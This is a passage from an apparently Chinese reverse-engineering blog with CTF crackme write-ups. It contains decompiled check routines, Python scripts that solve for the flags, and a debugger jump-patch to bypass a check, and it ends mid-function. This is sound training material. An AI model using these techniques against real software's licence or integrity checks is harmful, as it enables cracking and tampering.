<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="YungGong" type="application/atom+xml" />






<meta name="description" content="Yun&apos;s Bolg">
<meta property="og:type" content="website">
<meta property="og:title" content="YungGong">
<meta property="og:url" content="http://yunnigu.dropsec.xyz/page/2/index.html">
<meta property="og:site_name" content="YungGong">
<meta property="og:description" content="Yun&apos;s Bolg">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="YungGong">
<meta name="twitter:description" content="Yun&apos;s Bolg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yunnigu.dropsec.xyz/page/2/"/>





  <title>YungGong</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">YungGong</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">生命不息，逆向不止</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2017/01/19/reverse之第三更/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yun">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="YungGong">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/01/19/reverse之第三更/" itemprop="url">reverse之第三更</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-01-19T16:46:44+08:00">
                2017-01-19
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <a id="more"></a>
<p><img src="http://p1.bqimg.com/567571/528cb055bab8a010.png" alt=""></p>
<p>程序打开，对话框上的确定按钮一直是隐藏的，输入16个字符之后按钮会显示出来。</p>
<p>使用OD打开程序，搜索字符串，找到了你赢啦，“Flag就是你的口令”。</p>
<p><img src="http://p1.bqimg.com/567571/08cdef6067b2cb75.png" alt=""></p>
<p>这段代码的主要作用是判断0x00571458内存里字符串的长度，如果是8就跳转到成功，所以只要使0x00571458字符串长度为8就成功了。</p>
<p>接下来在0x00571458处下硬件断点，废了好大功夫下好这个断点，羞愧欲死啊！！！</p>
<p>首先在数据窗口跟随</p>
<p><img src="http://i1.piimg.com/567571/4c4f1a43d29ca874.png" alt=""></p>
<p>接下来转到表达式，00571458，选中地址的数据段，在该位置下硬件写入断点。<br>再次运行会出现在如下位置：<br><img src="http://i1.piimg.com/567571/578aad55142c8f09.png" alt=""></p>
<p>输入的16个字符经过004017C0()函数每两个字符组合为一组，例如ABCDEF1234567890变成了AB，CD，EF，12，34，56，78，90</p>
<p><img src="http://i1.piimg.com/567571/338969cf397fd41b.png" alt=""></p>
<p>接下来就是找关键的加密算法：</p>
<p><img src="http://i1.piimg.com/567571/14beb8b431510235.png" alt=""></p>
<p>找到sub_401B80()函数</p>
<pre><code>int __stdcall sub_401B80(int a1)
{
  sub_401970();
  if ( (unsigned __int8)(flag_3_ + flag_2_ + flag_1_ + flag_0_) == 71
    &amp;&amp; (unsigned __int8)(flag_7_ + flag_6_ + flag_5_) == 3
    &amp;&amp; (unsigned __int8)flag_0_ == flag_1_ + 68
    &amp;&amp; flag_1_ == (unsigned __int8)flag_2_ + 2
    &amp;&amp; (unsigned __int8)flag_2_ == (unsigned __int8)flag_3_ - 59
    &amp;&amp; (unsigned __int8)flag_6_ == (unsigned __int8)flag_4_ + 10
    &amp;&amp; (unsigned __int8)flag_6_ == (unsigned __int8)flag_7_ + 9
    &amp;&amp; (unsigned __int8)flag_4_ == flag_5_ + 52 )
  {
    JUMPOUT(__CS__, 0x1947 + 0x400000);
  }
  return 0;
}
</code></pre><p>sub_401970()函数是加密过程之后就是判断输入是否正确。</p>
<p>首先将上面的方程组解出来，方程组分成两个部分解，flag0，1，2，3一起，flag4，5，6，7一起解。需要注意的是int8类型</p>
<p>flag4~flag7只有一个解</p>
<pre><code>flag4=100，flag5=48，flag6=110，flag7=101
</code></pre><p>flag0~flag4有三个解</p>
<pre><code>flag0=183,flag1=115,flag2=113,flag3=172
flag0=119,flag1=51,flag2=49,flag3=108
flag0=247,flag1=179,flag2=177,flag3=236
</code></pre><p>sub_401970()函数里是一个置换表，每一个输入的字符都会经过四次置换，最终进行判断。</p>
<p>还有一个需要注意的是在没输入之前和输入之后置换表是不一样的，运行之后是正确的置换表：</p>
<pre><code>0056B0D0  63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76  
0056B0E0  CA 82 C9 7D FA 59 47 F0 AD D4 A2 AF 9C A4 72 C0 
0056B0F0  B7 FD 93 26 36 3F F7 CC 34 A5 E5 F1 71 D8 31 15  
0056B100  04 C7 23 C3 18 96 05 9A 07 12 80 E2 EB 27 B2 75  
0056B110  09 83 2C 1A 1B 6E 5A A0 52 3B D6 B3 29 E3 2F 84  
0056B120  53 D1 00 ED 20 FC B1 5B 6A CB BE 39 4A 4C 58 CF 
0056B130  D0 EF AA FB 43 4D 33 85 45 F9 02 7F 50 3C 9F A8  
0056B140  51 A3 40 8F 92 9D 38 F5 BC B6 DA 21 10 FF F3 D2  
0056B150  CD 0C 13 EC 5F 97 44 17 C4 A7 7E 3D 64 5D 19 73  
0056B160  60 81 4F DC 22 2A 90 88 46 EE B8 14 DE 5E 0B DB  
0056B170  E0 32 3A 0A 49 06 24 5C C2 D3 AC 62 91 95 E4 79  
0056B180  E7 C8 37 6D 8D D5 4E A9 6C 56 F4 EA 65 7A AE 08 
0056B190  BA 78 25 2E 1C A6 B4 C6 E8 DD 74 1F 4B BD 8B 8A  
0056B1A0  70 3E B5 66 48 03 F6 0E 61 35 57 B9 86 C1 1D 9E 
0056B1B0  E1 F8 98 11 69 D9 8E 94 9B 1E 87 E9 CE 55 28 DF
0056B1C0  8C A1 89 0D BF E6 42 68 41 99 2D 0F B0 54 BB 16  
</code></pre><p><img src="http://i1.piimg.com/567571/dbc9f5f1362bf56f.png" alt=""></p>
<p>通过置换表逆推flag</p>
<pre><code>buf=[0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
        0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
        0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
        0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
        0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
        0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
        0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
        0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
        0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
        0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
        0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
        0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
        0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
        0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
        0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
        0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16]
d={}
for n,item in enumerate(buf):
    d[item]=n
#buf1=[183,115,113,172,100,48,110,101]
#buf1=[247,179,177,236,100,48,110,101]
buf1=[119,51,49,108,100,48,110,101]

flag=&apos;&apos;
for i in buf1:
    nCurrent=i
    for j in range(0,64*4):
        nCurrent=d[nCurrent]
    flag+=&quot;%02X&quot;%nCurrent
print(flag)
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2017/01/15/信大校赛/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yun">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="YungGong">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/01/15/信大校赛/" itemprop="url">信大校赛</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-01-15T16:06:58+08:00">
                2017-01-15
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <a id="more"></a>
<h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><p>题目比较简单，使用反编译工具查看java代码如下：</p>
<pre><code>import android.content.Context;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.EditText;
import android.widget.Toast;

class a
  implements View.OnClickListener
{
  a(MainActivity paramMainActivity, EditText paramEditText, Context paramContext) {}

  public void onClick(View paramView)
  {
    if (this.a.getText().toString().equals(String.format(&quot;flag{%s}&quot;, new Object[] { MainActivity.m.substring(12, 24) })))
    {
      Toast.makeText(this.b, &quot;You are right!&quot;, 1).show();
      return;
    }
    Toast.makeText(this.b, &quot;You are wrong!&quot;, 1).show();
  }
}
</code></pre><p>程序的主要算法流程是将<br>gUID<em>P@Rt}T10n</em>$C#3m3Gu]d_par7|t)On<em>SCH3M3<br>这个字符串经过substring(12, 24)变化之后得到新的字符串，substring() 方法用于提取字符串中介于两个指定下标之间的字符，也就是说将下标12到下标20之间的字符串提取出来，结果是0n</em>$C#3m3Gu]。</p>
<h1 id="warmup-re"><a href="#warmup-re" class="headerlink" title="warmup-re"></a>warmup-re</h1><p>拖到IDA里看一下伪代码：</p>
<pre><code>// local variable allocation has failed, the output may be wrong!
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax@1
  __int64 v4; // rdx@1
  __int64 v5; // rax@1
  __int64 v6; // rbx@1
  __int64 v7; // rdx@1
  __int64 v8; // rax@1
  __int64 v9; // rdx@1
  __int64 v10; // rax@2
  __int64 v11; // rdx@2
  int result; // eax@2
  __int64 v13; // rax@5
  __int64 v14; // rdx@5
  unsigned __int64 v15; // rbx@7
  unsigned __int64 v16; // rax@7
  __int64 v17; // rax@8
  __int64 v18; // rdx@8
  char v19[48]; // [sp+20h] [bp-60h]@1
  char v20[48]; // [sp+50h] [bp-30h]@1
  char v21[48]; // [sp+80h] [bp+0h]@4
  int v22; // [sp+B0h] [bp+30h]@1
  int v23; // [sp+B4h] [bp+34h]@1
  int v24; // [sp+B8h] [bp+38h]@1
  int v25; // [sp+BCh] [bp+3Ch]@1
  int v26; // [sp+C0h] [bp+40h]@1
  int v27; // [sp+C4h] [bp+44h]@1
  int v28; // [sp+C8h] [bp+48h]@1
  int v29; // [sp+CCh] [bp+4Ch]@1
  int v30; // [sp+D0h] [bp+50h]@1
  int v31; // [sp+D4h] [bp+54h]@1
  int v32; // [sp+D8h] [bp+58h]@1
  int v33; // [sp+DCh] [bp+5Ch]@1
  int v34; // [sp+E0h] [bp+60h]@1
  int v35; // [sp+E4h] [bp+64h]@1
  int v36; // [sp+E8h] [bp+68h]@1
  int v37; // [sp+ECh] [bp+6Ch]@1
  int v38; // [sp+F0h] [bp+70h]@1
  int v39; // [sp+F4h] [bp+74h]@1
  int v40; // [sp+F8h] [bp+78h]@1
  int v41; // [sp+FCh] [bp+7Ch]@1
  int v42; // [sp+100h] [bp+80h]@1
  char v43; // [sp+10Ah] [bp+8Ah]@4
  char v44; // [sp+10Bh] [bp+8Bh]@4
  int i; // [sp+10Ch] [bp+8Ch]@3

  _main();
  v22 = 86;
  v23 = 30;
  v24 = 24;
  v25 = 1;
  v26 = 21;
  v27 = 90;
  v28 = 27;
  v29 = 29;
  v30 = 6;
  v31 = 29;
  v32 = 76;
  v33 = 84;
  v34 = 22;
  v35 = 20;
  v36 = 85;
  v37 = 28;
  v38 = 22;
  v39 = 21;
  v40 = 30;
  v41 = 29;
  v42 = 23;
  LODWORD(v3) = std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;&gt;(*(_QWORD *)&amp;argc, argv, v19, refptr__ZSt3cin);
  std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;&gt;(*(_QWORD *)&amp;argc, argv, v20, v3);
  LODWORD(v5) = strlen(*(_QWORD *)&amp;argc, argv, v4, v19);
  v6 = v5;
  LODWORD(v8) = strlen(*(_QWORD *)&amp;argc, argv, v7, v20);
  if ( v6 == v8 )
  {
    for ( i = 0; ; ++i )
    {
      v15 = i;
      LODWORD(v16) = strlen(*(_QWORD *)&amp;argc, argv, v9, v19);
      if ( v15 &gt;= v16 )
        break;
      v44 = v19[i];
      v43 = v20[i];
      v21[i] = v43 ^ v44;
      v9 = (unsigned int)v21[i];
      if ( (_DWORD)v9 != *(&amp;v22 + i) )
      {
        LODWORD(v13) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(*(_QWORD *)&amp;argc, argv, &quot;key error&quot;, refptr__ZSt4cout);
        std::ostream::operator&lt;&lt;(
          *(_QWORD *)&amp;argc,
          argv,
          refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_,
          v13);
        system(*(_QWORD *)&amp;argc, argv, v14, &quot;pause&quot;);
        return 0;
      }
    }
    LODWORD(v17) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(
                     *(_QWORD *)&amp;argc,
                     argv,
                     &quot;Yes!input is flag&quot;,
                     refptr__ZSt4cout);
    std::ostream::operator&lt;&lt;(
      *(_QWORD *)&amp;argc,
      argv,
      refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_,
      v17);
    system(*(_QWORD *)&amp;argc, argv, v18, &quot;pause&quot;);
    result = 0;
  }
  else
  {
    LODWORD(v10) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(*(_QWORD *)&amp;argc, argv, &quot;lenth error&quot;, refptr__ZSt4cout);
    std::ostream::operator&lt;&lt;(
      *(_QWORD *)&amp;argc,
      argv,
      refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_,
      v10);
    system(*(_QWORD *)&amp;argc, argv, v11, &quot;pause&quot;);
    result = 0;
  }
  return result;
}
</code></pre><p>程序的意思就是输入两个长度相等的字符串之后进行异或运算，将运算结果和程序给出的v22的数组中的内容比较，提示给出其中一个字符串是goodgoodstudydaydayup，解密脚本如下：</p>
<pre><code>v1=[86,30,24,1,21,90,27,29,6,29,76,84,22,20,85,28,22,21,30,29,23]
v2=[103,111,111,100,103,111,111,100,115,116,117,100,121,100,97,121,100,97,121,117,112]
flag=[]
for i in xrange(0,21):
    flag+=chr(list(v1)[i]^list(v2)[i])
print(flag)
</code></pre><p>结果是</p>
<pre><code>[&apos;1&apos;, &apos;q&apos;, &apos;w&apos;, &apos;e&apos;, &apos;r&apos;, &apos;5&apos;, &apos;t&apos;, &apos;y&apos;, &apos;u&apos;, &apos;i&apos;, &apos;9&apos;, &apos;0&apos;, &apos;o&apos;, &apos;p&apos;, &apos;4&apos;, &apos;e&apos;, &apos;r&apos;, &apos;t&apos;, &apos;g&apos;, &apos;h&apos;, &apos;g&apos;]
</code></pre><h1 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h1><p>使用IDA分析，关键函数是encrypt()</p>
<pre><code>       v19 = 0;
  LODWORD(v16) = std::string::operator[](a2, 0LL);
  while ( *v16 )
  {
    LODWORD(v2) = std::string::operator[](a2, v19);
    v3 = *v2;
    LODWORD(v4) = std::vector&lt;int,std::allocator&lt;int&gt;&gt;::operator[](&amp;primos, v19);
    v18 = v3 + *v4;
    LODWORD(v5) = std::string::operator[](a2, v19);
    if ( (unsigned __int8)is_lower(*v5) )
    {
      v6 = 122;
    }
    else
    {
      LODWORD(v7) = std::string::operator[](a2, v19);
      if ( (unsigned __int8)is_upper(*v7) )
      {
        v6 = 90;
      }
      else
      {
        LODWORD(v8) = std::string::operator[](a2, v19);
        v6 = *v8;
      }
    }
    while ( v18 &gt; v6 )
      v18 -= 26;
    LODWORD(v9) = std::string::operator[](a2, v19);
    v10 = v9;
    LODWORD(v11) = std::string::operator[](a2, v19);
    if ( *v11 == 123 )
    {
      v14 = 125;
    }
    else
    {
      LODWORD(v12) = std::string::operator[](a2, v19);
      if ( *v12 == 125 )
      {
        v14 = 123;
      }
      else
      {
        LODWORD(v13) = std::string::operator[](a2, v19);
        if ( (unsigned __int8)is_alphabet(*v13) )
        {
          v14 = v18;
        }
        else
        {
          LODWORD(v15) = std::string::operator[](a2, v19);
          v14 = *v15;
        }
      }
    }
    *v10 = v14;
    LODWORD(v16) = std::string::operator[](a2, ++v19);
  }
  std::string::string(a1, a2);
  return a1;
}
</code></pre><p>查找字符串还找到了个flag</p>
<pre><code>LNLNGW}o3A3g5Z_1b_Xv5d_WbzgGnbG{
</code></pre><p>程序流程是将你输入的正确的flag，每一位加上prime[]相应位置的值，如果是{}的话，{换成｝，｝换成｛。如果是字母，判断大小写运算后是否超出范围，如果超出范围就减去26直到符合大小写范围为止，然后逆推算法就可以了。比较麻烦的是prime[]是什么，程序里还有一个initial()</p>
<pre><code>  for ( i = 2; i &lt;= 1023; ++i )
    ehprimo[(signed __int64)i] = (i &amp; 1) != 0;
  for ( j = 3; ; j += 2 )
  {
    result = j;
    if ( (signed int)j &gt; 1023 )
      break;
    if ( ehprimo[(signed __int64)(signed int)j] )
    {
      std::vector&lt;int,std::allocator&lt;int&gt;&gt;::push_back(&amp;primos, &amp;j);
      for ( k = j * j; (signed int)k &lt;= 1023; k += j )
        ehprimo[(signed __int64)(signed int)k] = 0;
    }
  }
  return result;
}
</code></pre><p>这个函数是求0~1024之间的素数，不包括2作为prime[]的数据。</p>
<p>最后逆推出来flag为IIECTF{r3V3r5E_1s_Ea5y_DeadBeeF}</p>
<h1 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h1><p>IDA反编译发现想要获得flag需要通过4个check函数：</p>
<p>第一个cheack</p>
<pre><code>signed int check1(void)
{
  signed int v1; // [sp+10h] [bp-8h]@7

  puts(&quot;Give me your favourite prime number&quot;);
  scanf(&quot;%lld&quot;, &amp;n);
  a = 0x100000LL;
  b = 0LL;
  c = 0LL;
  while ( !(a &amp; 1) )
  {
    a /= 2LL;
    ++b;
  }
  while ( !(b &amp; 1) )
  {
    b /= 2LL;
    ++c;
  }
  if ( c == n )
  {
    flag += n;
    v1 = 1;
  }
  else
  {
    puts(&quot;^^^^Your math is bad^^^^&quot;);
    v1 = 0;
  }
  return v1;
}
</code></pre><p>python跑出来符合条件的数是2</p>
<pre><code>a=1048576
b=0
c=0
var=a&amp;1
while var==0:
    a=a/2
    var=a&amp;1
    b=b+1
print(b)
vbr=b&amp;1
while vbr==0:
    b=b/2
    vbr=b&amp;1
    c=c+1
print(c)
</code></pre><p>chack2</p>
<pre><code>signed int check2(void)
{
  signed int v1; // [sp+24h] [bp-14h]@10
  __int64 v2; // [sp+28h] [bp-10h]@1

  puts(&quot;Do you know how to calculate the number&quot;);
  puts(&quot;please enter a number&quot;);
  scanf(&quot;%lld&quot;, &amp;n);
  v2 = n;
  if ( tmpans != n * tmp % mod || n &gt; 999999 )
    goto LABEL_15;
  while ( n )
  {
    x[++pos] = n % 10;
    n /= 10LL;
  }
  if ( dword_448044 &gt;= dword_448048
    || dword_448048 &gt;= dword_44804C
    || dword_44804C &gt;= dword_448050
    || dword_448050 &gt;= dword_448054
    || dword_448054 &gt;= dword_448058 )
  {
LABEL_15:
    puts(&quot;You do not know how to calculate the mod~~~~&quot;);
    v1 = 0;
  }
  else
  {
    flag += v2;
    v1 = 1;
  }
  return v1;
}
</code></pre><p>python代码得出符合条件的数是654321</p>
<pre><code>tmpans=779852816
tmp=123456
mod=1000000007
i=1
for i in xrange(1,1000000):
    if(i*tmp%mod==tmpans):
        print(i)
</code></pre><p>check3</p>
<p>python脚本得出符合条件的字符串是Lcont=gpfoog`q</p>
<pre><code>str1=[]
for i in range(14):
    j=i%6+1
    str1.append(j)
print(str1)

v18=&quot;MerryChristmas&quot;
list=list(v18)
for i in range(len(list)):
    list[i]=ord(list[i])
print(list)

flag=[]
for i in range(14):
    flag.append(list[i]-str1[i])
print(flag)

flag1=&quot;&quot;
for i in range(14):
    flag1+=chr(flag[i])
print(flag1)
</code></pre><p>check4</p>
<p>在OD里动态调试修改跳转最后一个符合条件的数字是176455667</p>
<p>四关都过了，最后将每一关的key输入就可以了。<br>flag is:176455667HqGpGpFoFoEnGpHqBk</p>
<h1 id="61dre"><a href="#61dre" class="headerlink" title="61dre"></a>61dre</h1><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  bool v3; // r13@2
  int v4; // eax@5
  const char *v5; // rdi@11
  size_t v6; // rax@11
  size_t v7; // rax@15
  char *v8; // rcx@15
  const char *v9; // rsi@15
  bool v10; // di@17
  const char **v12; // [sp+0h] [bp-80h]@2
  unsigned __int64 v13; // [sp+8h] [bp-78h]@11
  int v14; // [sp+14h] [bp-6Ch]@5
  char *s1; // [sp+18h] [bp-68h]@2
  const char **v16; // [sp+20h] [bp-60h]@2
  const char ***v17; // [sp+28h] [bp-58h]@2
  bool v18; // [sp+37h] [bp-49h]@2
  int *v19; // [sp+38h] [bp-48h]@2
  const char ***v20; // [sp+40h] [bp-40h]@2
  const char **v21; // [sp+48h] [bp-38h]@1
  int v22; // [sp+54h] [bp-2Ch]@1

  v22 = argc;
  v21 = argv;
  if ( !(((unsigned __int8)((y &lt; 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) | (y &lt; 10
                                                                               &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) &amp; 1) )
    goto LABEL_20;
  while ( 1 )
  {
    v12 = v21;
    v3 = (((_BYTE)x - 106 + 105) * (_BYTE)x &amp; 1) == 0;
    v20 = &amp;v12 - 2;
    v19 = (int *)&amp;v12;
    v18 = (_DWORD)v21 != 2;
    v17 = &amp;v12;
    v16 = (const char **)&amp;v12;
    s1 = (char *)(&amp;v12 - 6);
    if ( ((y &lt; 10 &amp;&amp; v3) | (unsigned __int8)((y &lt; 10) ^ v3)) &amp; 1 )
      break;
LABEL_20:
    LODWORD(v12) = 0;
    *((_DWORD *)&amp;v12 - 4) = v22;
    *(&amp;v12 - 2) = v21;
  }
  if ( v18 )
  {
    while ( !(((unsigned __int8)((y &lt; 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) | (y &lt; 10
                                                                                    &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) &amp; 1) )
      ;
LABEL_5:
    v4 = printf(&quot;Usage: %s flag\n&quot;, **v17, v12);
    *v19 = 0;
    v14 = v4;
    return *v19;
  }
  *v16 = (const char *)&amp;unk_400E54;
  if ( strlen((*v17)[1]) != 32 )
  {
    while ( !(((y &lt; 10 &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0) | (unsigned __int8)((y &gt;= 10) ^ ((((_BYTE)x - 1)
                                                                                                * (_BYTE)x &amp; 1) != 0))) &amp; 1) )
      ;
    goto LABEL_5;
  }
  if ( !(((y &lt; 10 &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0) | (unsigned __int8)((y &gt;= 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) != 0))) &amp; 1) )
    goto LABEL_23;
  while ( 1 )
  {
    *(_DWORD *)v20 = 0;
    if ( ((y &lt; 10 &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0) | (unsigned __int8)((y &gt;= 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) != 0))) &amp; 1 )
      break;
LABEL_23:
    *(_DWORD *)v20 = 0;
  }
  while ( 1 )
  {
    v5 = (*v17)[1];
    v13 = *(_DWORD *)v20;
    v6 = strlen(v5);
    if ( v13 &gt;= v6 )
      break;
    if ( !(((unsigned __int8)((y &lt; 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) | (y &lt; 10
                                                                                 &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) &amp; 1) )
      goto LABEL_24;
    while ( 1 )
    {
      s1[*(_DWORD *)v20] = (*(_BYTE *)v20 &amp; 0x89 | ~*(_BYTE *)v20 &amp; 0x76) ^ ((*v17)[1][*(_DWORD *)v20] &amp; 0x89 | ~(*v17)[1][*(_DWORD *)v20] &amp; 0x76);
      if ( ((unsigned __int8)((y &lt; 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) | (y &lt; 10
                                                                                 &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) &amp; 1 )
        break;
